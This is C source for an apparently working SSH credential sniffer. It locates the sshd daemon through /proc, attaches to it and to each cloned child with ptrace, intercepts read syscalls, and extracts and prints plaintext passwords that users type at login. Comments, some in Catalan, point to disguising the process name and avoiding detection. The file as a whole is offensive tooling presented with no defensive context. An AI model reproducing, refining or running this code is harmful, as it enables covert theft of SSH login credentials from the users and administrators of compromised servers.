#include <stdlib.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "syscalls.h"
//#include <sys/reg.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


pid_t pid = 0;
int attached = 0;

void attach(){
    int status;
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1){
        printf ("[!] Can't attach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 1;
    waitpid(pid, &status, 0);
    printf("[*] Attached to pid %d.\n", pid); fflush(stdout);
}

void detach(){
    int status;
    if (ptrace(PTRACE_DETACH, pid , 0, 0) == -1){
        printf ("[!] can't dettach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 0;
    waitpid(pid, &status, 0);
    printf("[*] Dettached.\n"); fflush(stdout);
}

void quit(char *msg, int ret){
    printf("%s\n", msg); fflush (stdout);
    if (attached) detach();
    exit (ret);
}

int check_ssh_password(unsigned char *buff, int len){
	// Password string is | uint | chars |
	if (len > 32 || len < 5) return 0;

    // ptr points to the last char of the string
	unsigned char *ptr = buff+len-1;
	//printf("buff: %p, ptr: %p, len: %d\n", buff, ptr, len);
	
	while (*ptr != 0x00) ptr--;
	//printf("ptr: %p\n", ptr);

	// Now we must have two bytes 0x00 at left and one < 0x0f at right
	//printf("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
	if ( *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return 0;
	//if (*(ptr+1) > 0x0f || *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return;

	// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1
	//printf("%d\n", buff+len-1-ptr);
	if (((buff+len-1)-(ptr+1)) != *(ptr+1)) return 0;

	write(1, ptr+2, *(ptr+1));
    putchar('\n');
    return 1;
}

int sshdPid(char *cmdline) {
	struct dirent *de;
    char statusPath[32];
    FILE *statusFile;
    int sshdPid = 0;
    int sshdPpid = 0;
    int fd = 0;
    char sshdState;

	DIR *proc = opendir("/proc");
	if (!proc) {
		perror("opendir");
		exit(0);
	}
	while ((de=readdir(proc))) {
        sprintf(statusPath, "/proc/%s/stat", de->d_name);
        statusFile = fopen(statusPath, "r");
        if (statusFile) {
            if (fscanf(statusFile, "%d (sshd) %c %d", &sshdPid, &sshdState, &sshdPpid) == 3 && sshdPpid == 1) {
                printf("Pid %d!\n", sshdPid);
                fclose(statusFile);
                sprintf(statusPath, "/proc/%s/cmdline", de->d_name);
                fd = open(statusPath, O_RDONLY);
                read(fd, cmdline, 64);
                close(fd);
                return sshdPid;
            }
            fclose(statusFile);
        } 
    }
    return 0;
}

void mread(long int addr, long int size, int *dest){
    int i = 0;
    size = (size % 4) ? size/4 + 1 : size/4;
    bzero(dest, size);
    errno = 0;
    for (i = 0; i < size; i++) {
        dest[i] = ptrace(PTRACE_PEEKTEXT, pid, addr+i*4,0);
        //printf("@0x%lx = %08x\n", addr+i*4, dest[i]);
        if(errno != 0) {
            printf(" => 0x%lx ",addr+i);fflush(stdout);
            perror("ptrace");
            errno = 0;
        }
    }
}
 
void lookForReads(pid_t eax) {
    long orig_eax;
    int status;
    int insyscall = 0;
    struct pt_regs regs;
    char * pass = 0;
    pid = eax;
    
    attach();
    while(1) {
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        wait(&status);

        if(WIFEXITED(status)) {
            printf("Acabant procés %d %x\n", getpid(), status);
            break;
        }
        orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);

        if ( orig_eax == __NR_read) {
                if(insyscall == 0) {
                    insyscall = 1;
                    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
                }
                else {
                    insyscall = 0;
                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
                    //printf("[%d] Read returned with %ld\n", getpid(), eax);
                    if (eax > 5 && eax < 32) {
                        unsigned char pass[64];
                        memset(pass, 0, 64);
                        mread(regs.ecx, eax, (int *)pass);
                        // +3 because mread overflows 3 bytes
                        check_ssh_password(pass, eax);
                    }
                }
        }
    }
    exit(0);
}

int main(int argc, char *argv[]) {
    char procName[64];
    long orig_eax;
    pid_t eax;
    int status;
    int insyscall = 0;
    struct pt_regs regs;
    char * pass = 0;

    int exitPid;

    // Buscar pid del proces sshd
	pid = sshdPid(procName);
    if (!pid) {
        printf("sshd no trobat, sortint...\n");
        exit(0);
    }

    // Canviar el nom del procés a cmdline del sshd
    printf("Canviant nom a %s\n", procName);

    // Procés pare que per cada clone, crea un fill
    attach();
    while(1) {
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        exitPid = wait(&status);

        // TODO: pensar is posar aquestes condicions també en l'altre procés
        // TODO: sembla que si faig Ctr + C, queda el proces en stopped
        // TODO: mirar bé que no hi hagi res q canti molt ni cap leak
        if (WIFSTOPPED(status) && exitPid == pid && WSTOPSIG(status) != 5 && WSTOPSIG(status) != 17) {
            printf("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
            kill(pid, WSTOPSIG(status));
            break;
        }
        orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);

        switch (orig_eax) {
            case __NR_clone:
                if(insyscall == 0) 
                    insyscall = 1;
                else {
                    insyscall = 0;
                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
                    if(!fork()) {
                        lookForReads(eax);
                    }
                }
                break;
            case __NR_read:
                if(insyscall == 0) {
                    insyscall = 1;
                    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
                }
                else {
                    insyscall = 0;
                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
                    //printf("[%d] Read returned with %ld\n", getpid(), eax);
                    if (eax > 5 && eax < 32) {
                        unsigned char pass[64];
                        memset(pass, 0, 64);
                        mread(regs.ecx, eax, (int *)pass);
                        // +3 because mread overflows 3 bytes
                        check_ssh_password(pass, eax);
                    }
                }
                break;
        }
    }

	return 0;
}
